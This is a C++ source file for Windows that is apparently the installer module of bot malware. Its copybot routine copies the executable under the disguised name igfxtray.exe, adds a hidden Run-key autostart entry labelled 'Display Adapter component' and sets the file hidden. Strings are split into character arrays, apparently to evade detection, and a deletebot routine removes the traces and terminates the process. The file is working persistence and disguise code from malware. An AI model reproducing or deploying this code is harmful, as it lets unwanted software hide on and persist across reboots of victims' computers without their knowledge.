#include <Windows.h>
#include <Shlwapi.h> // SHregistry
#pragma comment(lib, "Shlwapi.lib")

#include "Utils.h"
#include "Sysinfo.h"
#include "InstallUtil.h"

static	WCHAR winNT[] = {'\\','W','i','n','d','o','w','s',' ','N','T','\\', 0};
static	WCHAR ms[] = {'\\','M','i','c','r','o','s','o','f','t','\\', 0};
static  WCHAR botname[] = {'i','g','f','x','t','r','a','y','.','e','x','e', 0};
static  WCHAR regname[]={'D','i','s','p','l','a','y',' ','A','d','a','p','t','e','r',' ','c','o','m','p','o','n','e','n','t', 0};
static  WCHAR regkey[]={'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n', 0};


bool copybot(wchar_t execloc[MAX_PATH])
{
	WCHAR wcmdcopy[260]; //cmd params
	WCHAR wcmdreg[260]; //cmd params
	WCHAR wcmdloc[260]; //cmd location
	WCHAR botloc[260]; //bot location (destination)

	bool admin = false;

	//check if we have admin priviliges
	if( HasAdminPrivileges() )
	{
		admin = true;
	}
	if(admin)
	{
		wsprintfW ( botloc, L"%s%s%s", GetShellFoldersKey(3), winNT, botname ); // program files
	} else
	{
		wsprintfW ( botloc, L"%s%s%s", GetShellFoldersKey(2), ms, botname ); //all appdata
	}	
	if(!StrCmpW(execloc, botloc))
	{
		return false;
	}
	WCHAR comspec[] = {'C','o','m','S','p','e','c', 0};
	size_t	nSize = _countof(wcmdloc);
	_wgetenv_s( &nSize, wcmdloc, comspec); //grab ComSpec loc > cmd.exe
	STARTUPINFOW si; 
	PROCESS_INFORMATION pi; 
	memset(&si, 0, sizeof(si)); 
	memset(&pi, 0, sizeof(pi)); 
	si.cb = sizeof(si);
	WCHAR wcmdParam[] = {'/','c',' ','c','o','p','y', 0};
	wsprintfW(wcmdcopy, L"%s \"%s\" \"%s\" /V",wcmdParam, execloc, botloc);
	CreateProcessW(wcmdloc, wcmdcopy, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	WCHAR wherekey[10];
	if(admin)
	{
		lstrcpyW(wherekey, L"HKLM");
	} else
	{
		lstrcpyW(wherekey, L"HKCU");
	}
	wsprintfW(wcmdreg, L"/c REG ADD \"%s\\%s\" /v \"%s\" /t REG_SZ /d \"%s\" /F",wherekey, regkey, regname, botloc);
	CreateProcessW(wcmdloc, wcmdreg, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	if(PathFileExistsW(botloc))
	{
		SetFileAttributesW(botloc, FILE_ATTRIBUTE_HIDDEN);
	}
	return true;
}


void deletebot()
{	
	HUSKEY		hKey;
	LSTATUS		lStat = NULL;
	lStat = SHRegOpenUSKeyW ( regkey, 
							  KEY_ALL_ACCESS ,
							  NULL ,
							  &hKey , 
							  0 
							);

	if ( lStat == ERROR_SUCCESS ) 
	{
		if ( HasAdminPrivileges() ) 
		{
			SHRegDeleteUSValueW ( hKey,
								 regname,
								 SHREGDEL_HKLM 
							    );	
			SHRegCloseUSKey ( hKey );
		} 
		else
			SHRegDeleteUSValueW ( hKey,
								 regname,
								 SHREGDEL_HKCU
							    );	
			SHRegCloseUSKey ( hKey );
	}
	WCHAR TempFilePath[ MAX_PATH ];
	WCHAR NewTempFilePath[ MAX_PATH ];
	wsprintfW(NewTempFilePath, L"%s\\d.tmp", GetShellFoldersKey(2));
	GetModuleFileNameW ( GetModuleHandleW ( NULL ), TempFilePath, sizeof ( TempFilePath ) );
	MoveFileExW(TempFilePath, NewTempFilePath, MOVEFILE_WRITE_THROUGH);
	TerminateProcess(GetCurrentProcess(), 0);
}